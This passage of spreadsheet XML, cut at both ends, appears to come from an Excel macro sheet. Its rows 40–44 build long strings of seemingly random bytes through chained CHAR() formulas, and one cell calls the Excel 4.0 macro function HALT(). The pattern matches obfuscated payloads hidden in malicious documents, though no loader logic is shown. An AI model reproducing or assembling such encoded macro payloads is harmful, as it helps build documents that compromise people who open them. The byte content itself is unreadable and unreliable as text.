HAR(192)&amp;CHAR(240)&amp;CHAR(127)&amp;CHAR(159)&amp;CHAR(166)&amp;CHAR(92)&amp;CHAR(15)&amp;CHAR(30)&amp;CHAR(242)&amp;CHAR(198)&amp;CHAR(10)&amp;CHAR(21)&amp;CHAR(140)&amp;CHAR(89)&amp;CHAR(14)&amp;CHAR(42)&amp;CHAR(2)&amp;CHAR(22)&amp;CHAR(77)&amp;CHAR(188)&amp;CHAR(33)&amp;CHAR(38)&amp;CHAR(245)&amp;CHAR(222)&amp;CHAR(104)&amp;CHAR(244)&amp;CHAR(157)&amp;CHAR(160)&amp;CHAR(213)&amp;CHAR(56)&amp;CHAR(81)&amp;CHAR(242)&amp;CHAR(107)&amp;CHAR(222)&amp;CHAR(127)&amp;CHAR(144)&amp;CHAR(221)&amp;CHAR(90)&amp;CHAR(50)&amp;CHAR(169)&amp;CHAR(219)&amp;CHAR(16)&amp;CHAR(165)&amp;CHAR(66)&amp;CHAR(179)&amp;CHAR(92)&amp;CHAR(18)&amp;CHAR(115)&amp;CHAR(62)&amp;CHAR(6)&amp;CHAR(199)&amp;CHAR(129)&amp;CHAR(176)&amp;CHAR(3)&amp;CHAR(82)&amp;CHAR(100)&amp;CHAR(80)&amp;CHAR(118)&amp;CHAR(80)&amp;CHAR(118)&amp;CHAR(151)&amp;CHAR(103)&amp;CHAR(85)&amp;CHAR(241)&amp;CHAR(221)&amp;CHAR(250)&amp;CHAR(37)&amp;CHAR(107)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(168)&amp;CHAR(210)&amp;CHAR(225)&amp;CHAR(11)&amp;CHAR(254)&amp;CHAR(83)&amp;CHAR(61)&amp;CHAR(184)&amp;CHAR(93)&amp;CHAR(157)&amp;CHAR(191)&amp;CHAR(68)&amp;CHAR(228)&amp;CHAR(208)&amp;CHAR(166)&amp;CHAR(29)&amp;CHAR(182)&amp;CHAR(84)&amp;CHAR(250)&amp;CHAR(149)&amp;CHAR(151)&amp;CHAR(155)&amp;CHAR(70)&amp;CHAR(74)&amp;CHAR(174)&amp;CHAR(199)&amp;CHAR(181)&amp;CHAR(137)&amp;CHAR(208)&amp;CHAR(43)&amp;CHAR(102)&amp;CHAR(196)&amp;CHAR(80)&amp;CHAR(225)&amp;CHAR(45)&amp;CHAR(169)&amp;CHAR(113)&amp;CHAR(48)&amp;CHAR(211)&amp;CHAR(68)&amp;CHAR(35)&amp;CHAR(73)&amp;CHAR(191)&amp;CHAR(182)&amp;CHAR(111)&amp;CHAR(53)&amp;CHAR(213)&amp;CHAR(239)&amp;CHAR(179)&amp;CHAR(189)&amp;CHAR(104)&amp;CHAR(183)&amp;CHAR(129)&amp;CHAR(220)&amp;CHAR(148)&amp;CHAR(22)&amp;CHAR(152)&amp;CHAR(213)&amp;CHAR(31)&amp;CHAR(6)&amp;CHAR(142)&amp;CHAR(6)&amp;CHAR(6)&amp;CHAR(246)&amp;CHAR(219)&amp;CHAR(129)&amp;CHAR(243)&amp;CHAR(111)&amp;CHAR(75)&amp;CHAR(104)&amp;CHAR(81)&amp;CHAR(90)&amp;CHAR(34)&amp;CHAR(108)&amp;CHAR(58)&amp;CHAR(233)&amp;CHAR(120)&amp;CHAR(42)&amp;CHAR(95)&amp;CHAR(94)&amp;CHAR(51)&amp;CHAR(175)&amp;CHAR(55)&amp;CHAR(60)&amp;CHAR(66)&amp;CHAR(203)&amp;CHAR(56)&amp;CHAR(224)&amp;CHAR(215)&amp;CHAR(255)&amp;CHAR(217)&amp;CHAR(62)&amp;CHAR(163)&amp;CHAR(208)&amp;CHAR(197)&amp;CHAR(216)&amp;CHAR(235)&amp;CHAR(74)&amp;CHAR(54)&amp;CHAR(150)&amp;CHAR(40)&amp;CHAR(160)&amp;CHAR(254)&amp;CHAR(247)&amp;CHAR(15)&amp;CHAR(106)&amp;CHAR(170)&amp;CHAR(133)&amp;CHAR(195)</f>
        <v>ÕNž¡dÑ _x0005_CRâðË_x0016_g_x0006_ýËÞ­_x0006_²¿Z£–_x0004__x0004_‹=tõ•_x0007_d_x0002_*¶’ë T•_x0019__x000B_ðù%‚¦x:`¢ûË_x000B_’¬3xÚ_x0016_A³_x0004_ã=g_x0006_6Ž¿'ßÀðŸ¦\_x000F__x001E_òÆ
_x0015_ŒY_x000E_*_x0002__x0016_M¼!&amp;õÞhô Õ8QòkÞÝZ2©Û_x0010_¥B³\_x0012_s&gt;_x0006_Ç°_x0003_RdPvPv—gUñÝú%k†¯¨Òá_x000B_þS=¸]¿DäÐ¦_x001D_¶Tú•—›FJ®Çµ‰Ð+fÄPá-©q0ÓD#I¿¶o5Õï³½h·Ü”_x0016_˜Õ_x001F__x0006_Ž_x0006__x0006_öÛóoKhQZ"l:éx*_^3¯7&lt;BË8à×ÿÙ&gt;£ÐÅØëJ6–( þ÷_x000F_jª…Ã</v>
      </c>
      <c r="C40" t="str">
        <f>CHAR(113)&amp;CHAR(122)&amp;CHAR(192)&amp;CHAR(103)&amp;CHAR(156)&amp;CHAR(174)&amp;CHAR(189)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(146)</f>
        <v>qzÀgœ®½ôq’</v>
      </c>
    </row>
    <row r="41" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A41" t="b">
        <f>HALT()</f>
        <v>0</v>
      </c>
      <c r="B41" t="str">
        <f>CHAR(59)&amp;CHAR(200)&amp;CHAR(7)&amp;CHAR(15)&amp;CHAR(218)&amp;CHAR(3)&amp;CHAR(26)&amp;CHAR(174)&amp;CHAR(18)&amp;CHAR(160)&amp;CHAR(34)&amp;CHAR(92)&amp;CHAR(69)&amp;CHAR(168)&amp;CHAR(212)&amp;CHAR(248)&amp;CHAR(246)&amp;CHAR(24)&amp;CHAR(239)&amp;CHAR(80)&amp;CHAR(239)&amp;CHAR(89)&amp;CHAR(25)&amp;CHAR(67)&amp;CHAR(209)&amp;CHAR(93)&amp;CHAR(166)&amp;CHAR(163)&amp;CHAR(167)&amp;CHAR(153)&amp;CHAR(184)&amp;CHAR(70)&amp;CHAR(120)&amp;CHAR(242)&amp;CHAR(150)&amp;CHAR(197)&amp;CHAR(153)&amp;CHAR(160)&amp;CHAR(103)&amp;CHAR(111)&amp;CHAR(149)&amp;CHAR(185)&amp;CHAR(79)&amp;CHAR(41)&amp;CHAR(75)&amp;CHAR(178)&amp;CHAR(166)&amp;CHAR(146)&amp;CHAR(117)&amp;CHAR(229)&amp;CHAR(215)&amp;CHAR(182)&amp;CHAR(132)&amp;CHAR(57)&amp;CHAR(255)&amp;CHAR(25)&amp;CHAR(147)&amp;CHAR(224)&amp;CHAR(11)&amp;CHAR(252)&amp;CHAR(114)&amp;CHAR(116)&amp;CHAR(83)&amp;CHAR(234)&amp;CHAR(171)&amp;CHAR(170)&amp;CHAR(204)&amp;CHAR(27)&amp;CHAR(147)&amp;CHAR(230)&amp;CHAR(64)&amp;CHAR(68)&amp;CHAR(51)&amp;CHAR(138)&amp;CHAR(238)&amp;CHAR(253)&amp;CHAR(235)&amp;CHAR(76)&amp;CHAR(37)&amp;CHAR(104)&amp;CHAR(14)&amp;CHAR(54)&amp;CHAR(74)&amp;CHAR(80)&amp;CHAR(2)&amp;CHAR(221)&amp;CHAR(210)&amp;CHAR(227)&amp;CHAR(27)&amp;CHAR(72)&amp;CHAR(237)&amp;CHAR(134)&amp;CHAR(29)&amp;CHAR(161)&amp;CHAR(39)&amp;CHAR(180)&amp;CHAR(3)&amp;CHAR(174)&amp;CHAR(131)&amp;CHAR(9)&amp;CHAR(104)&amp;CHAR(13)&amp;CHAR(148)&amp;CHAR(7)&amp;CHAR(8)&amp;CHAR(196)&amp;CHAR(137)&amp;CHAR(254)&amp;CHAR(163)&amp;CHAR(204)&amp;CHAR(153)&amp;CHAR(133)&amp;CHAR(171)&amp;CHAR(172)&amp;CHAR(51)&amp;CHAR(62)&amp;CHAR(186)&amp;CHAR(45)&amp;CHAR(255)&amp;CHAR(199)&amp;CHAR(206)&amp;CHAR(196)&amp;CHAR(104)&amp;CHAR(245)&amp;CHAR(71)&amp;CHAR(57)&amp;CHAR(204)&amp;CHAR(25)&amp;CHAR(175)&amp;CHAR(245)&amp;CHAR(48)&amp;CHAR(217)&amp;CHAR(226)&amp;CHAR(106)&amp;CHAR(23)&amp;CHAR(249)&amp;CHAR(21)&amp;CHAR(53)&amp;CHAR(51)&amp;CHAR(192)&amp;CHAR(187)&amp;CHAR(44)&amp;CHAR(151)&amp;CHAR(216)&amp;CHAR(29)&amp;CHAR(212)&amp;CHAR(70)&amp;CHAR(154)&amp;CHAR(251)&amp;CHAR(228)&amp;CHAR(83)&amp;CHAR(147)&amp;CHAR(19)&amp;CHAR(33)&amp;CHAR(225)&amp;CHAR(124)&amp;CHAR(210)&amp;CHAR(161)&amp;CHAR(218)&amp;CHAR(11)&amp;CHAR(150)&amp;CHAR(14)&amp;CHAR(190)&amp;CHAR(31)&amp;CHAR(193)&amp;CHAR(158)&amp;CHAR(96)&amp;CHAR(70)&amp;CHAR(94)&amp;CHAR(12)&amp;CHAR(155)&amp;CHAR(63)&amp;CHAR(250)&amp;CHAR(42)&amp;CHAR(75)&amp;CHAR(174)&amp;CHAR(203)&amp;CHAR(193)&amp;CHAR(154)&amp;CHAR(127)&amp;CHAR(200)&amp;CHAR(55)&amp;CHAR(114)&amp;CHAR(176)&amp;CHAR(153)&amp;CHAR(1)&amp;CHAR(218)&amp;CHAR(109)&amp;CHAR(201)&amp;CHAR(138)&amp;CHAR(6)&amp;CHAR(97)&amp;CHAR(156)&amp;CHAR(87)&amp;CHAR(43)&amp;CHAR(190)&amp;CHAR(148)&amp;CHAR(207)&amp;CHAR(91)&amp;CHAR(147)&amp;CHAR(78)&amp;CHAR(217)&amp;CHAR(16)&amp;CHAR(212)&amp;CHAR(220)&amp;CHAR(38)&amp;CHAR(4)&amp;CHAR(213)&amp;CHAR(120)&amp;CHAR(211)&amp;CHAR(206)&amp;CHAR(17)&amp;CHAR(178)&amp;CHAR(52)&amp;CHAR(13)&amp;CHAR(169)&amp;CHAR(73)&amp;CHAR(63)&amp;CHAR(94)&amp;CHAR(221)&amp;CHAR(28)&amp;CHAR(120)&amp;CHAR(63)&amp;CHAR(201)&amp;CHAR(198)&amp;CHAR(188)&amp;CHAR(46)&amp;CHAR(5)&amp;CHAR(189)&amp;CHAR(199)&amp;CHAR(255)&amp;CHAR(193)&amp;CHAR(236)&amp;CHAR(83)&amp;CHAR(81)&amp;CHAR(77)&amp;CHAR(142)&amp;CHAR(119)&amp;CHAR(170)&amp;CHAR(237)&amp;CHAR(11)&amp;CHAR(93)&amp;CHAR(125)&amp;CHAR(84)&amp;CHAR(60)&amp;CHAR(243)&amp;CHAR(204)&amp;CHAR(141)&amp;CHAR(2)&amp;CHAR(62)&amp;CHAR(50)&amp;CHAR(125)&amp;CHAR(9)&amp;CHAR(245)&amp;CHAR(170)</f>
        <v>;È_x0007__x000F_Ú_x0003__x001A_®_x0012_ "\E¨Ôøö_x0018_ïPïY_x0019_CÑ]¦£§™¸Fxò–Å™ go•¹O)K²¦’uå×¶„9ÿ_x0019_“à_x000B_ürtSê«ªÌ_x001B_“æ@D3ŠîýëL%h_x000E_6JP_x0002_ÝÒã_x001B_Hí†_x001D_¡'´_x0003_®ƒ	h_x000D_”_x0007__x0008_Ä‰þ£Ì™…«¬3&gt;º-ÿÇÎÄhõG9Ì_x0019_¯õ0Ùâj_x0017_ù_x0015_53À»,—Ø_x001D_ÔFšûäS“_x0013_!á|Ò¡Ú_x000B_–_x000E_¾_x001F_Áž`F^_x000C_›?ú*K®ËÁšÈ7r°™_x0001_ÚmÉŠ_x0006_aœW+¾”Ï[“NÙ_x0010_ÔÜ&amp;_x0004_ÕxÓÎ_x0011_²4_x000D_©I?^Ý_x001C_x?ÉÆ¼._x0005_½ÇÿÁìSQMŽwªí_x000B_]}T&lt;óÌ_x0002_&gt;2}	õª</v>
      </c>
      <c r="C41" t="str">
        <f>CHAR(58)&amp;CHAR(233)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(221)&amp;CHAR(184)&amp;CHAR(250)&amp;CHAR(126)&amp;CHAR(173)&amp;CHAR(194)</f>
        <v>:é‘[Ý¸ú~­Â</v>
      </c>
    </row>
    <row r="42" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B42" t="str">
        <f>CHAR(212)&amp;CHAR(202)&amp;CHAR(193)&amp;CHAR(120)&amp;CHAR(163)&amp;CHAR(22)&amp;CHAR(82)&amp;CHAR(150)&amp;CHAR(34)&amp;CHAR(38)&amp;CHAR(87)&amp;CHAR(58)&amp;CHAR(112)&amp;CHAR(214)&amp;CHAR(13)&amp;CHAR(241)&amp;CHAR(155)&amp;CHAR(45)&amp;CHAR(138)&amp;CHAR(172)&amp;CHAR(183)&amp;CHAR(75)&amp;CHAR(179)&amp;CHAR(110)&amp;CHAR(247)&amp;CHAR(48)&amp;CHAR(154)&amp;CHAR(109)&amp;CHAR(242)&amp;CHAR(7)&amp;CHAR(140)&amp;CHAR(96)&amp;CHAR(140)&amp;CHAR(146)&amp;CHAR(23)&amp;CHAR(34)&amp;CHAR(191)&amp;CHAR(165)&amp;CHAR(111)&amp;CHAR(173)&amp;CHAR(242)&amp;CHAR(135)&amp;CHAR(207)&amp;CHAR(100)&amp;CHAR(76)&amp;CHAR(33)&amp;CHAR(101)&amp;CHAR(3)&amp;CHAR(56)&amp;CHAR(167)&amp;CHAR(222)&amp;CHAR(73)&amp;CHAR(43)&amp;CHAR(81)&amp;CHAR(38)&amp;CHAR(193)&amp;CHAR(55)&amp;CHAR(92)&amp;CHAR(158)&amp;CHAR(68)&amp;CHAR(222)&amp;CHAR(170)&amp;CHAR(232)&amp;CHAR(39)&amp;CHAR(22)&amp;CHAR(235)&amp;CHAR(212)&amp;CHAR(111)&amp;CHAR(121)&amp;CHAR(27)&amp;CHAR(245)&amp;CHAR(36)&amp;CHAR(220)&amp;CHAR(134)&amp;CHAR(113)&amp;CHAR(70)&amp;CHAR(237)&amp;CHAR(128)&amp;CHAR(57)&amp;CHAR(185)&amp;CHAR(190)&amp;CHAR(221)&amp;CHAR(232)&amp;CHAR(212)&amp;CHAR(4)&amp;CHAR(191)&amp;CHAR(89)&amp;CHAR(119)&amp;CHAR(91)&amp;CHAR(70)&amp;CHAR(36)&amp;CHAR(162)&amp;CHAR(45)&amp;CHAR(241)&amp;CHAR(229)&amp;CHAR(17)&amp;CHAR(243)&amp;CHAR(228)&amp;CHAR(216)&amp;CHAR(64)&amp;CHAR(22)&amp;CHAR(102)&amp;CHAR(220)&amp;CHAR(114)&amp;CHAR(221)&amp;CHAR(4)&amp;CHAR(102)&amp;CHAR(204)&amp;CHAR(246)&amp;CHAR(153)&amp;CHAR(24)&amp;CHAR(174)&amp;CHAR(55)&amp;CHAR(68)&amp;CHAR(17)&amp;CHAR(217)&amp;CHAR(159)&amp;CHAR(153)&amp;CHAR(150)&amp;CHAR(222)&amp;CHAR(87)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(149)&amp;CHAR(47)&amp;CHAR(100)&amp;CHAR(254)&amp;CHAR(19)&amp;CHAR(202)&amp;CHAR(36)&amp;CHAR(126)&amp;CHAR(163)&amp;CHAR(85)&amp;CHAR(218)&amp;CHAR(109)&amp;CHAR(200)&amp;CHAR(137)&amp;CHAR(150)&amp;CHAR(115)&amp;CHAR(147)&amp;CHAR(158)&amp;CHAR(99)&amp;CHAR(226)&amp;CHAR(233)&amp;CHAR(188)&amp;CHAR(34)&amp;CHAR(17)&amp;CHAR(173)&amp;CHAR(57)&amp;CHAR(69)&amp;CHAR(207)&amp;CHAR(113)&amp;CHAR(175)&amp;CHAR(64)&amp;CHAR(34)&amp;CHAR(234)&amp;CHAR(150)&amp;CHAR(143)&amp;CHAR(162)&amp;CHAR(128)&amp;CHAR(235)&amp;CHAR(233)&amp;CHAR(24)&amp;CHAR(105)&amp;CHAR(147)&amp;CHAR(53)&amp;CHAR(162)&amp;CHAR(40)&amp;CHAR(83)&amp;CHAR(250)&amp;CHAR(80)&amp;CHAR(32)&amp;CHAR(238)&amp;CHAR(179)&amp;CHAR(254)&amp;CHAR(76)&amp;CHAR(11)&amp;CHAR(104)&amp;CHAR(130)&amp;CHAR(11)&amp;CHAR(170)&amp;CHAR(9)&amp;CHAR(158)&amp;CHAR(198)&amp;CHAR(188)&amp;CHAR(51)&amp;CHAR(11)&amp;CHAR(81)&amp;CHAR(92)&amp;CHAR(180)&amp;CHAR(173)&amp;CHAR(198)&amp;CHAR(246)&amp;CHAR(194)&amp;CHAR(243)&amp;CHAR(66)&amp;CHAR(222)&amp;CHAR(229)&amp;CHAR(108)&amp;CHAR(158)&amp;CHAR(159)&amp;CHAR(209)&amp;CHAR(141)&amp;CHAR(127)&amp;CHAR(173)&amp;CHAR(76)&amp;CHAR(103)&amp;CHAR(23)&amp;CHAR(24)&amp;CHAR(70)&amp;CHAR(86)&amp;CHAR(87)&amp;CHAR(114)&amp;CHAR(108)&amp;CHAR(249)&amp;CHAR(219)&amp;CHAR(174)&amp;CHAR(2)&amp;CHAR(65)&amp;CHAR(39)&amp;CHAR(229)&amp;CHAR(5)&amp;CHAR(255)&amp;CHAR(144)&amp;CHAR(34)&amp;CHAR(160)&amp;CHAR(175)&amp;CHAR(57)&amp;CHAR(67)&amp;CHAR(206)&amp;CHAR(197)&amp;CHAR(217)&amp;CHAR(49)&amp;CHAR(204)&amp;CHAR(190)&amp;CHAR(51)&amp;CHAR(172)&amp;CHAR(139)&amp;CHAR(45)&amp;CHAR(102)&amp;CHAR(100)&amp;CHAR(220)&amp;CHAR(148)&amp;CHAR(112)&amp;CHAR(82)&amp;CHAR(41)&amp;CHAR(51)&amp;CHAR(29)&amp;CHAR(91)&amp;CHAR(205)&amp;CHAR(71)&amp;CHAR(53)&amp;CHAR(63)&amp;CHAR(78)&amp;CHAR(166)</f>
        <v>ÔÊÁx£_x0016_R–"&amp;W:pÖ_x000D_ñ›-Š¬·K³n÷0šmò_x0007_Œ`Œ’_x0017_"¿¥o­ò‡ÏdL!e_x0003_8§ÞI+Q&amp;Á7\žDÞªè'_x0016_ëÔoy_x001B_õ$Ü†qFí€9¹¾ÝèÔ_x0004_¿Yw[F$¢-ñå_x0011_óäØ@_x0016_fÜrÝ_x0004_fÌö™_x0018_®7D_x0011_ÙŸ™–ÞW_x0006__x0003_•/dþ_x0013_Ê$~£UÚmÈ‰–s“žcâé¼"_x0011_­9EÏq¯@"ê–¢€ëé_x0018_i“5¢(SúP î³þL_x000B_h‚_x000B_ª	žÆ¼3_x000B_Q\´­ÆöÂóBÞålžŸÑ­Lg_x0017__x0018_FVWrlùÛ®_x0002_A'å_x0005_ÿ" ¯9CÎÅÙ1Ì¾3¬‹-fdÜ”pR)3_x001D_[ÍG5?N¦</v>
      </c>
      <c r="C42" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(189)&amp;CHAR(242)&amp;CHAR(186)&amp;CHAR(216)&amp;CHAR(162)&amp;CHAR(28)&amp;CHAR(78)</f>
        <v>‘[¸½òºØ¢_x001C_N</v>
      </c>
    </row>
    <row r="43" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B43" t="str">
        <f>CHAR(93)&amp;CHAR(214)&amp;CHAR(202)&amp;CHAR(186)&amp;CHAR(249)&amp;CHAR(96)&amp;CHAR(222)&amp;CHAR(35)&amp;CHAR(197)&amp;CHAR(160)&amp;CHAR(204)&amp;CHAR(148)&amp;CHAR(64)&amp;CHAR(189)&amp;CHAR(156)&amp;CHAR(190)&amp;CHAR(7)&amp;CHAR(127)&amp;CHAR(153)&amp;CHAR(94)&amp;CHAR(139)&amp;CHAR(134)&amp;CHAR(170)&amp;CHAR(226)&amp;CHAR(12)&amp;CHAR(212)&amp;CHAR(16)&amp;CHAR(111)&amp;CHAR(111)&amp;CHAR(105)&amp;CHAR(119)&amp;CHAR(52)&amp;CHAR(107)&amp;CHAR(36)&amp;CHAR(170)&amp;CHAR(147)&amp;CHAR(128)&amp;CHAR(86)&amp;CHAR(132)&amp;CHAR(112)&amp;CHAR(79)&amp;CHAR(28)&amp;CHAR(122)&amp;CHAR(210)&amp;CHAR(149)&amp;CHAR(26)&amp;CHAR(220)&amp;CHAR(218)&amp;CHAR(139)&amp;CHAR(152)&amp;CHAR(23)&amp;CHAR(68)&amp;CHAR(203)&amp;CHAR(184)&amp;CHAR(200)&amp;CHAR(246)&amp;CHAR(35)&amp;CHAR(230)&amp;CHAR(148)&amp;CHAR(130)&amp;CHAR(65)&amp;CHAR(110)&amp;CHAR(86)&amp;CHAR(135)&amp;CHAR(133)&amp;CHAR(244)&amp;CHAR(211)&amp;CHAR(244)&amp;CHAR(199)&amp;CHAR(92)&amp;CHAR(109)&amp;CHAR(150)&amp;CHAR(8)&amp;CHAR(72)&amp;CHAR(113)&amp;CHAR(69)&amp;CHAR(120)&amp;CHAR(19)&amp;CHAR(153)&amp;CHAR(94)&amp;CHAR(104)&amp;CHAR(10)&amp;CHAR(213)&amp;CHAR(176)&amp;CHAR(172)&amp;CHAR(177)&amp;CHAR(219)&amp;CHAR(37)&amp;CHAR(91)&amp;CHAR(244)&amp;CHAR(242)&amp;CHAR(206)&amp;CHAR(128)&amp;CHAR(77)&amp;CHAR(31)&amp;CHAR(108)&amp;CHAR(230)&amp;CHAR(77)&amp;CHAR(48)&amp;CHAR(42)&amp;CHAR(94)&amp;CHAR(117)&amp;CHAR(98)&amp;CHAR(109)&amp;CHAR(132)&amp;CHAR(41)&amp;CHAR(128)&amp;CHAR(255)&amp;CHAR(98)&amp;CHAR(30)&amp;CHAR(16)&amp;CHAR(239)&amp;CHAR(125)&amp;CHAR(74)&amp;CHAR(125)&amp;CHAR(104)&amp;CHAR(76)&amp;CHAR(41)&amp;CHAR(234)&amp;CHAR(158)&amp;CHAR(51)&amp;CHAR(68)&amp;CHAR(122)&amp;CHAR(51)&amp;CHAR(229)&amp;CHAR(172)&amp;CHAR(83)&amp;CHAR(188)&amp;CHAR(200)&amp;CHAR(192)&amp;CHAR(230)&amp;CHAR(107)&amp;CHAR(68)&amp;CHAR(24)&amp;CHAR(227)&amp;CHAR(252)&amp;CHAR(54)&amp;CHAR(49)&amp;CHAR(144)&amp;CHAR(15)&amp;CHAR(93)&amp;CHAR(121)&amp;CHAR(17)&amp;CHAR(195)&amp;CHAR(95)&amp;CHAR(74)&amp;CHAR(49)&amp;CHAR(35)&amp;CHAR(166)&amp;CHAR(82)&amp;CHAR(7)&amp;CHAR(15)&amp;CHAR(184)&amp;CHAR(233)&amp;CHAR(32)&amp;CHAR(124)&amp;CHAR(62)&amp;CHAR(238)&amp;CHAR(234)&amp;CHAR(124)&amp;CHAR(44)&amp;CHAR(56)&amp;CHAR(162)&amp;CHAR(201)&amp;CHAR(74)&amp;CHAR(50)&amp;CHAR(53)&amp;CHAR(214)&amp;CHAR(4)&amp;CHAR(83)&amp;CHAR(196)&amp;CHAR(131)&amp;CHAR(133)&amp;CHAR(14)&amp;CHAR(195)&amp;CHAR(135)&amp;CHAR(95)&amp;CHAR(25)&amp;CHAR(112)&amp;CHAR(50)&amp;CHAR(98)&amp;CHAR(48)&amp;CHAR(116)&amp;CHAR(198)&amp;CHAR(23)&amp;CHAR(31)&amp;CHAR(113)&amp;CHAR(243)&amp;CHAR(153)&amp;CHAR(143)&amp;CHAR(82)&amp;CHAR(219)&amp;CHAR(83)&amp;CHAR(37)&amp;CHAR(153)&amp;CHAR(205)&amp;CHAR(102)&amp;CHAR(2)&amp;CHAR(188)&amp;CHAR(91)&amp;CHAR(101)&amp;CHAR(32)&amp;CHAR(33)&amp;CHAR(107)&amp;CHAR(251)&amp;CHAR(188)&amp;CHAR(94)&amp;CHAR(105)&amp;CHAR(66)&amp;CHAR(4)&amp;CHAR(126)&amp;CHAR(125)&amp;CHAR(199)&amp;CHAR(49)&amp;CHAR(241)&amp;CHAR(26)&amp;CHAR(183)&amp;CHAR(106)&amp;CHAR(2)&amp;CHAR(158)&amp;CHAR(41)&amp;CHAR(211)&amp;CHAR(119)&amp;CHAR(221)&amp;CHAR(141)&amp;CHAR(115)&amp;CHAR(219)&amp;CHAR(192)&amp;CHAR(129)&amp;CHAR(46)&amp;CHAR(146)&amp;CHAR(251)&amp;CHAR(184)&amp;CHAR(231)&amp;CHAR(194)&amp;CHAR(56)&amp;CHAR(246)&amp;CHAR(40)&amp;CHAR(102)&amp;CHAR(207)&amp;CHAR(216)&amp;CHAR(133)&amp;CHAR(143)&amp;CHAR(222)&amp;CHAR(108)&amp;CHAR(232)&amp;CHAR(108)&amp;CHAR(79)&amp;CHAR(32)&amp;CHAR(176)&amp;CHAR(140)&amp;CHAR(239)&amp;CHAR(193)&amp;CHAR(129)&amp;CHAR(248)</f>
        <v>]ÖÊºù`Þ#Å Ì”@½œ¾_x0007_™^‹†ªâ_x000C_Ô_x0010_ooiw4k$ª“€V„pO_x001C_zÒ•_x001A_ÜÚ‹˜_x0017_DË¸Èö#æ”‚AnV‡…ôÓôÇ\m–_x0008_HqEx_x0013_™^h
Õ°¬±Û%[ôòÎ€M_x001F_læM0*^ubm„)€ÿb_x001E__x0010_ï}J}hL)êž3Dz3å¬S¼ÈÀækD_x0018_ãü61_x000F_]y_x0011_Ã_J1#¦R_x0007__x000F_¸é |&gt;îê|,8¢ÉJ25Ö_x0004_SÄƒ…_x000E_Ã‡__x0019_p2b0tÆ_x0017__x001F_qó™RÛS%™Íf_x0002_¼[e !kû¼^iB_x0004_~}Ç1ñ_x001A_·j_x0002_ž)ÓwÝsÛÀ.’û¸çÂ8ö(fÏØ…ÞlèlO °ŒïÁø</v>
      </c>
      <c r="C43" t="str">
        <f>CHAR(173)&amp;CHAR(241)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(192)&amp;CHAR(103)&amp;CHAR(156)&amp;CHAR(165)&amp;CHAR(188)&amp;CHAR(244)</f>
        <v>­ñqzÀgœ¥¼ô</v>
      </c>
    </row>
    <row r="44" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B44" t="str">
        <f>CHAR(212)&amp;CHAR(88)&amp;CHAR(40)&amp;CHAR(82)&amp;CHAR(130)&amp;CHAR(216)&amp;CHAR(20)&amp;CHAR(214)&amp;CHAR(61)&amp;CHAR(145)&amp;CHAR(209)&amp;CHAR(52)&amp;CHAR(73)&amp;CHAR(41)&amp;CHAR(51)&amp;CHAR(181)&amp;CHAR(30)&amp;CHAR(223)&amp;CHAR(114)&amp;CHAR(219)&amp;CHAR(164)&amp;CHAR(242)&amp;CHAR(150)&amp;CHAR(16)&amp;CHAR(23)&amp;CHAR(50)&amp;CHAR(123)&amp;CHAR(4)&amp;CHAR(37)&amp;CHAR(42)&amp;CHAR(213)&amp;CHAR(211)&amp;CHAR(26)&amp;CHAR(61)&amp;CHAR(58)&amp;CHAR(232)&amp;CHAR(97)&amp;CHAR(101)&amp;CHAR(122)&amp;CHAR(56)&amp;CHAR(138)&amp;CHAR(115)&amp;CHAR(225)&amp;CHAR(72)&amp;CHAR(105)&amp;CHAR(201)&amp;CHAR(23)&amp;CHAR(43)&amp;CHAR(62)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(164)&amp;CHAR(66)&amp;CHAR(224)&amp;CHAR(87)&amp;CHAR(55)&amp;CHAR(200)&amp;CHAR(7)&amp;CHAR(90)&amp;CHAR(22)&amp;CHAR(175)&amp;CHAR(113)&amp;CHAR(69)&amp;CHAR(42)&amp;CHAR(201)&amp;CHAR(164)&amp;CHAR(226)&amp;CHAR(31)&amp;CHAR(53)&amp;CHAR(174)&amp;CHAR(117)&amp;CHAR(2)&amp;CHAR(190)&amp;CHAR(91)&amp;CHAR(207)&amp;CHAR(31)&amp;CHAR(78)&amp;CHAR(140)&amp;CHAR(236)&amp;CHAR(130)&amp;CHAR(6)&amp;CHAR(72)&amp;CHAR(193)&amp;CHAR(31)&amp;CHAR(157)&amp;CHAR(69)&amp;CHAR(172)&amp;CHAR(163)&amp;CHAR(23)&amp;CHAR(56)&amp;CHAR(189)&amp;CHAR(134)&amp;CHAR(96)&amp;CHAR(32)&amp;CHAR(2)&amp;CHAR(85)&amp;CHAR(166)&amp;CHAR(194)&amp;CHAR(203)&amp;CHAR(207)&amp;CHAR(155)&amp;CHAR(11)&amp;CHAR(204)&amp;CHAR(133)&amp;CHAR(252)&amp;CHAR(194)&amp;CHAR(195)&amp;CHAR(146)&amp;CHAR(174)&amp;CHAR(101)&amp;CHAR(131)&amp;CHAR(250)&amp;CHAR(99)&amp;CHAR(92)&amp;CHAR(79)&amp;CHAR(182)&amp;CHAR(61)&amp;CHAR(123)&amp;CHAR(39)&amp;CHAR(31)&amp;CHAR(189)&amp;CHAR(19)&amp;CHAR(124)&amp;CHAR(30)&amp;CHAR(254)&amp;CHAR(168)&amp;CHAR(13)&amp;CHAR(187)&amp;CHAR(107)&amp;CHAR(76)&amp;CHAR(20)&amp;CHAR(178)&amp;CHAR(217)&amp;CHAR(198)&amp;CHAR(31)&amp;CHAR(121)&amp;CHAR(132)&amp;CHAR(221)&amp;CHAR(222)&amp;CHAR(184)&amp;CHAR(240)&amp;CHAR(21)&amp;CHAR(87)&amp;CHAR(49)&amp;CHAR(37)&amp;CHAR(70)&amp;CHAR(115)&amp;CHAR(213)&amp;CHAR(255)&amp;CHAR(125)&amp;CHAR(220)&amp;CHAR(189)&amp;CHAR(232)&amp;CHAR(119)&amp;CHAR(236)&amp;CHAR(41)&amp;CHAR(182)&amp;CHAR(115)&amp;CHAR(168)&amp;CHAR(110)&amp;CHAR(123)&amp;CHAR(167)&amp;CHAR(53)&amp;CHAR(250)&amp